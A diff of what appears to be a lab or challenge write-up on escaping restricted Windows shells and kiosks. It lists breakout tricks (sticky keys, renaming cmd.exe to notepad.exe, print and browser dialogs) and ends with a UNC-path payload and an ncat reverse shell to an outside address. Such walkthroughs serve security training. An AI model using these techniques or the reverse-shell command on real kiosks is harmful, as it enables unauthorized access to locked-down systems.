@@ -19,13 +19,20 @@
 ### Restricted1
 
 **Breaking out**
+
 a) Right-click on Start button -> File Explorer
+
 b) Windows Button -> type name of program you want to execute
 
+
 **Solutions**
+
 a) ftp.exe -> !whoami
+
 b) powershell -> whoami
+
 c) powershell_ise -> whoami
+
 d) batch script -> open notepad, type whoami > whoami.txt, run script
 
 ### Restricted2
@@ -33,8 +40,11 @@ d) batch script -> open notepad, type whoami > whoami.txt, run script
 *Can only run notepad*
 
 **Solutions**
+
 a) Copy ftp.exe to desktop -> rename to notepad.exe -> !whoami
+
 b) Copy cmd.exe to desktop -> rename to notepad.exe -> whoami
+
 c) Copy custom shell (ex. React OS) to desktop -> rename to notepad.exe -> whoami
 
 ### Kiosk1
@@ -42,12 +52,19 @@ c) Copy custom shell (ex. React OS) to desktop -> rename to notepad.exe -> whoam
 *Aka the worst kiosk ever! The main challenge here is getting an explorer window, from there it is trivial to execute anything.*
 
 **Solutions**
+
 a) Sticky Keys: Press Shift 5x -> Press on Link in the popup window
+
 b) Task Manager: CTRL+SHIFT+ESC -> File -> Run New Task
+
 c) Print: Right-click anywhere -> Print -> Find Printer
+
 d) Open new tab -> Right-Click&Translate with Bing -> Or press F1
+
   * file:///C:/Windows/system32/cmd.exe
+  
 e) Developer Tools: Press F12 -> Performance Tab -> Press on 3rd icon "Importing Profile Session"
+
 f) Open menu: Press CTRL+O -> Press Browse
 
 ### Kiosk2
@@ -55,6 +72,7 @@ f) Open menu: Press CTRL+O -> Press Browse
 *Uses Assigned access to expose a single Windows application to the user. Pretty decent lockdown, lots of mitigations in place, Microsoft made a concerted effort to prevent breakout. However, one thing was overlooked..*
 
 **Solution**
+
 a) Possible to mount UNC path. Even though visibility is restricted to folders, it is possible to execute binaries even with arguments.
   * \\EvilServer\Share\Payload.exe
   * \\127.0.0.1\C$\DefCon-Tools\Tools\ncat.exe -nv 192.168.187.1 443 -e C:\Windows\System32\cmd.exe
